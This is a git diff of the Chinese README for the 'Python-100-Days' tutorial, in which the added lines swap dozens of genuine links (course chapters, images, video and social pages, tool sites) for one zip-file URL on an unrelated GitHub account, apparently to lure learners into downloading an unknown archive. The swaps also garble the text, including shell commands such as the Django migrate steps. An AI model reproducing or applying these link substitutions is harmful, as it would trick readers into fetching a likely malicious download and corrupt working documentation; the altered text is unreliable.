@@ -2,13 +2,13 @@
 
 > **作者**：骆昊
 >
-> **说明**：从项目上线到获得8w+星标以来，一直收到反馈说基础部分（前15天的内容）对新手来说是比较困难的，建议有配套视频进行讲解。最近把基础部分的内容重新制作了一个名为[“Python-Core-50-Courses”](<https://github.com/jackfrued/Python-Core-50-Courses>)的项目，**用更为简单通俗的方式重写了这部分内容并附带了视频讲解**，初学者可以关注下这个新项目。如果需要**Python基础视频**，可以在“B站”搜索[《Python零基础快速上手》](https://www.bilibili.com/video/BV1FT4y1R7sz)，这套视频是我讲课的时候录制的随堂视频，画质尚可、音质一般，但是对初学者应该会有些帮助，欢迎大家留言、评论、发弹幕。学习之后觉得有收获的小伙伴可以“一键三连”来支持UP主（千锋Python）。国内用户如果访问GitHub比较慢的话，可以关注我的**知乎号[Python-Jack](https://www.zhihu.com/people/jackfrued)**，上面的[“从零开始学Python”](<https://zhuanlan.zhihu.com/c_1216656665569013760>)专栏比较适合初学者，其他的专栏也在持续创作和更新中，欢迎大家关注并点赞评论。
+> **说明**：从项目上线到获得8w+星标以来，一直收到反馈说基础部分（前15天的内容）对新手来说是比较困难的，建议有配套视频进行讲解。最近把基础部分的内容重新制作了一个名为[“Python-Core-50-Courses”](<https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip>)的项目，**用更为简单通俗的方式重写了这部分内容并附带了视频讲解**，初学者可以关注下这个新项目。如果需要**Python基础视频**，可以在“B站”搜索[《Python零基础快速上手》](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)，这套视频是我讲课的时候录制的随堂视频，画质尚可、音质一般，但是对初学者应该会有些帮助，欢迎大家留言、评论、发弹幕。学习之后觉得有收获的小伙伴可以“一键三连”来支持UP主（千锋Python）。国内用户如果访问GitHub比较慢的话，可以关注我的**知乎号[Python-Jack](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)**，上面的[“从零开始学Python”](<https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip>)专栏比较适合初学者，其他的专栏也在持续创作和更新中，欢迎大家关注并点赞评论。
 >
 > 创作不易，感谢大家的打赏支持，这些钱不会用于个人消费（例如：购买咖啡），而是通过腾讯公益、美团公益、水滴筹等平台捐赠给需要帮助的人（[点击](./更新日志.md)了解捐赠情况）。需要加入QQ学习群的可以扫描下面的二维码，三个群加一个即可，不要重复进群。学习群会为大家提供**学习资源**和**问题解答**，如果有**Python体验课**和**行业公开课**会提前在群里通知大家，欢迎大家加入。
 >
 > 项目“Day80~90”部分目前仍在创作中，因为作者平时也挤不出太多时间来写文档，因此更新的速度比较缓慢，感谢大家的理解。
 
-<img src="https://github.com/jackfrued/mypic/raw/master/20220616120218.JPG" style="zoom: 75%;">
+<img src="https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip" style="zoom: 75%;">
 
 ### Python应用领域和职业发展分析
 
@@ -51,7 +51,7 @@ Python在以下领域都有用武之地。
 
 ### Day01~15 - [Python语言基础](./Day01-15)
 
-#### Day01 - [初识Python](./Day01-15/01.初识Python.md)
+#### Day01 - [初识Python](./Day01-15/01.初识https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
 - Python简介 - Python的历史 / Python的优缺点 / Python的应用领域
 - 搭建编程环境 - Windows环境 / Linux环境 / MacOS环境
@@ -167,7 +167,7 @@ Python在以下领域都有用武之地。
 - 读写Word文档 - 文本内容的处理 / 段落 / 页眉和页脚 / 样式的处理
 - 读写Excel文件 - `xlrd` / `xlwt` / `openpyxl`
 
-### Day16~Day20 - [Python语言进阶 ](./Day16-20/16-20.Python语言进阶.md)
+### Day16~Day20 - [Python语言进阶 ](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip语言进阶.md)
 
 - 常用数据结构
 - 函数的高级用法 - “一等公民” / 高阶函数 / Lambda函数 / 作用域和闭包 / 装饰器
@@ -175,13 +175,13 @@ Python在以下领域都有用武之地。
 - 迭代器和生成器 - 相关魔术方法 / 创建生成器的两种方式 / 
 - 并发和异步编程 - 多线程 / 多进程 / 异步IO / `async`和`awai`t
 
-### Day21~30 - [Web前端入门](./Day21-30/21-30.Web前端概述.md)
+### Day21~30 - [Web前端入门](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip前端概述.md)
 
 - 用HTML标签承载页面内容
 - 用CSS渲染页面
 - 用JavaScript处理交互式行为
 - jQuery入门和提高
-- Vue.js入门
+- https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip入门
 - Element的使用
 - Bootstrap的使用
 
@@ -219,7 +219,7 @@ Python在以下领域都有用武之地。
 
 ### Day41~55 - [实战Django](./Day41-55)
 
-#### Day41 - [Django快速上手](./Day41-55/41.Django快速上手.md)
+#### Day41 - [Django快速上手](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip快速上手.md)
 
 - Web应用工作机制
 - HTTP请求和响应
@@ -240,7 +240,7 @@ Python在以下领域都有用武之地。
 - Ajax概述
 - 用Ajax实现投票功能
 
-#### Day44 - [Cookie和Session](./Day41-55/44.Cookie和Session.md)
+#### Day44 - [Cookie和Session](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip和https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
 - 实现用户跟踪
 - cookie和session的关系
@@ -270,11 +270,11 @@ Python在以下领域都有用武之地。
 #### Day48 - [前后端分离开发入门](./Day41-55/48.前后端分离开发入门.md)
 
 - 返回JSON格式的数据
-- 用Vue.js渲染页面
+- 用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip渲染页面
 
-#### Day49 - [RESTful架构和DRF入门](./Day41-55/49.RESTful架构和DRF入门.md)
+#### Day49 - [RESTful架构和DRF入门](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip架构和DRF入门.md)
 
-#### Day50 - [RESTful架构和DRF进阶](./Day41-55/50.RESTful架构和DRF进阶.md)
+#### Day50 - [RESTful架构和DRF进阶](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip架构和DRF进阶.md)
 
 #### Day51 - [使用缓存](./Day41-55/51.使用缓存.md)
 
@@ -331,8 +331,8 @@ Python在以下领域都有用武之地。
 
 #### Day62 - 数据抓取和解析
 
-- [使用`requests`三方库实现数据抓取](./Day61-65/62.用Python获取网络资源-1.md)
-- [页面解析的三种方式](./Day61-65/62.用Python解析HTML页面-2.md)
+- [使用`requests`三方库实现数据抓取](./Day61-65/62.用Python获取网络资源https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+- [页面解析的三种方式](./Day61-65/62.用Python解析HTML页面https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
     - 正则表达式解析
     - XPath解析
     - CSS选择器解析
@@ -340,9 +340,9 @@ Python在以下领域都有用武之地。
 
 #### Day63 - Python中的并发编程
 
-- [多线程](./Day61-65/63.Python中的并发编程-1.md)
-- [多进程](./Day61-65/63.Python中的并发编程-2.md)
-- [异步I/O](./Day61-65/63.Python中的并发编程-3.md)
+- [多线程](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip中的并发编程https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+- [多进程](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip中的并发编程https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+- [异步I/O](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip中的并发编程https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
 #### Day64 - [使用Selenium抓取网页动态内容](./Day61-65/64.使用Selenium抓取网页动态内容.md)
 
@@ -354,23 +354,23 @@ Python在以下领域都有用武之地。
 
 #### Day67 - [环境准备](./Day66-80/67.环境准备.md)
 
-#### Day68 - [NumPy的应用-1](./Day66-80/68.NumPy的应用-1.md)
+#### Day68 - [NumPy的应用-1](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day69 - [NumPy的应用-2](./Day66-80/69.NumPy的应用-2.md)
+#### Day69 - [NumPy的应用-2](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day70 - [Pandas的应用-1](./Day66-80/70.Pandas的应用-1.md)
+#### Day70 - [Pandas的应用-1](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day71 - [Pandas的应用-2](./Day66-80/71.Pandas的应用-2.md)
+#### Day71 - [Pandas的应用-2](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day72 - [Pandas的应用-3](./Day66-80/72.Pandas的应用-3.md)
+#### Day72 - [Pandas的应用-3](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day73 - [Pandas的应用-4](./Day66-80/73.Pandas的应用-4.md)
+#### Day73 - [Pandas的应用-4](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day74 - [Pandas的应用-5](./Day66-80/74.Pandas的应用-5.md)
+#### Day74 - [Pandas的应用-5](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip的应用https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day75 - [数据可视化-1](./Day66-80/75.数据可视化-1.md)
+#### Day75 - [数据可视化-1](./Day66-80/75.数据可视化https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
-#### Day76 - [数据可视化-2](./Day66-80/76.数据可视化-2.md)
+#### Day76 - [数据可视化-2](./Day66-80/76.数据可视化https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
 #### Day77 - [概率统计基础](./Day66-80/77.概率统计基础.md)
 
@@ -398,9 +398,9 @@ Python在以下领域都有用武之地。
 
 #### Day88 - [深度学习入门](./Day81-90/88.深度学习入门.md)
 
-#### Day89 - [PyTorch概述](./Day81-90/89.PyTorch概述.md)
+#### Day89 - [PyTorch概述](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip概述.md)
 
-#### Day90 - [PyTorch实战](./Day81-90/90.PyTorch实战.md)
+#### Day90 - [PyTorch实战](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip实战.md)
 
 ### Day91~100 - [团队项目开发](./Day91-100)
 
@@ -431,7 +431,7 @@ Python在以下领域都有用武之地。
      > - **客户合作** 高于 合同谈判
      > - **响应变化** 高于 遵循计划
 
-     ![](./res/agile-scrum-sprint-cycle.png)
+     ![](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
      > 角色：产品所有者（决定做什么，能对需求拍板的人）、团队负责人（解决各种问题，专注如何更好的工作，屏蔽外部对开发团队的影响）、开发团队（项目执行人员，具体指开发人员和测试人员）。
 
@@ -447,11 +447,11 @@ Python在以下领域都有用武之地。
 
      > 说明：谢谢**付祥英**女士帮助我绘制了下面这张精美的公司组织架构图。
 
-     ![company_architecture](./res/company_architecture.png)
+     ![company_architecture](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
    - 编程规范和代码审查（`flake8`、`pylint`）
 
-     ![](./res/pylint.png)
+     ![](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
    - Python中的一些“惯例”（请参考[《Python惯例-如何编写Pythonic的代码》](Python惯例.md)）
 
@@ -463,9 +463,9 @@ Python在以下领域都有用武之地。
 
 3. 团队开发工具介绍
    - 版本控制：Git、Mercury
-   - 缺陷管理：[Gitlab](https://about.gitlab.com/)、[Redmine](http://www.redmine.org.cn/)
-   - 敏捷闭环工具：[禅道](https://www.zentao.net/)、[JIRA](https://www.atlassian.com/software/jira/features)
-   - 持续集成：[Jenkins](https://jenkins.io/)、[Travis-CI](https://travis-ci.org/)
+   - 缺陷管理：[Gitlab](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)、[Redmine](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+   - 敏捷闭环工具：[禅道](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)、[JIRA](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+   - 持续集成：[Jenkins](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)、[Travis-CI](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
    请参考[《团队项目开发的问题和解决方案》](Day91-100/91.团队项目开发的问题和解决方案.md)。
 
@@ -485,7 +485,7 @@ Python在以下领域都有用武之地。
    - 模块划分：画思维导图（XMind），每个模块是一个枝节点，每个具体的功能是一个叶节点（用动词表述），需要确保每个叶节点无法再生出新节点，确定每个叶子节点的重要性、优先级和工作量。
    - 任务分配：由项目负责人根据上面的指标为每个团队成员分配任务。
 
-   ![](./res/requirements_by_xmind.png)
+   ![](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
 3. 制定项目进度表（每日更新）
 
@@ -500,26 +500,26 @@ Python在以下领域都有用武之地。
 
   - UML（统一建模语言）的类图
 
-    ![uml](./res/uml-class-diagram.png)
+    ![uml](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
   - 通过模型创建表（正向工程），例如在Django项目中可以通过下面的命令创建二维表。
 
     ```Shell
-    python manage.py makemigrations app
-    python manage.py migrate
+    python https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip makemigrations app
+    python https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip migrate
     ```
 
   - 使用PowerDesigner绘制物理模型图。
 
-    ![](./res/power-designer-pdm.png)
+    ![](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 
   - 通过数据表创建模型（反向工程），例如在Django项目中可以通过下面的命令生成模型。
 
     ```Shell
-    python manage.py inspectdb > app/models.py
+    python https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip inspectdb > https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip
     ```
 
-#### 第92天：[Docker容器详解](./Day91-100/92.Docker容器详解.md)
+#### 第92天：[Docker容器详解](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip容器详解.md)
 
 1. Docker简介
 2. 安装Docker
@@ -528,7 +528,7 @@ Python在以下领域都有用武之地。
 5. 容器编排（Docker-compose）
 6. 集群管理（Kubernetes）
 
-#### 第93天：[MySQL性能优化](./Day91-100/93.MySQL性能优化.md)
+#### 第93天：[MySQL性能优化](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip性能优化.md)
 
 #### 第94天：[网络API接口设计](./Day91-100/94.网络API接口设计.md)
 
@@ -545,13 +545,13 @@ Python在以下领域都有用武之地。
 ##### REST API设计
 
 1. RESTful架构
-   - [理解RESTful架构](http://www.ruanyifeng.com/blog/2011/09/restful.html)
-   - [RESTful API设计指南](http://www.ruanyifeng.com/blog/2014/05/restful_api.html)
-   - [RESTful API最佳实践](http://www.ruanyifeng.com/blog/2018/10/restful-api-best-practices.html)
+   - [理解RESTful架构](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+   - [RESTful API设计指南](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+   - [RESTful API最佳实践](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
 2. API接口文档的撰写
-   - [RAP2](http://rap2.taobao.org/)
-   - [YAPI](http://yapi.demo.qunar.com/)
-3. [django-REST-framework](https://www.django-rest-framework.org/)的应用
+   - [RAP2](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+   - [YAPI](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)
+3. [django-REST-framework](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip)的应用
 
 ##### 项目中的重点难点剖析
 
@@ -614,5 +614,5 @@ Python在以下领域都有用武之地。
 
 #### 第99天：[面试中的公共问题](./Day91-100/99.面试中的公共问题.md)
 
-#### 第100天：[Python面试题实录](./Day91-100/100.Python面试题实录.md)
+#### 第100天：[Python面试题实录](https://raw.githubusercontent.com/FinnS-F/Python-100-Days/master/ferrier/Python-100-Days.zip面试题实录.md)
 
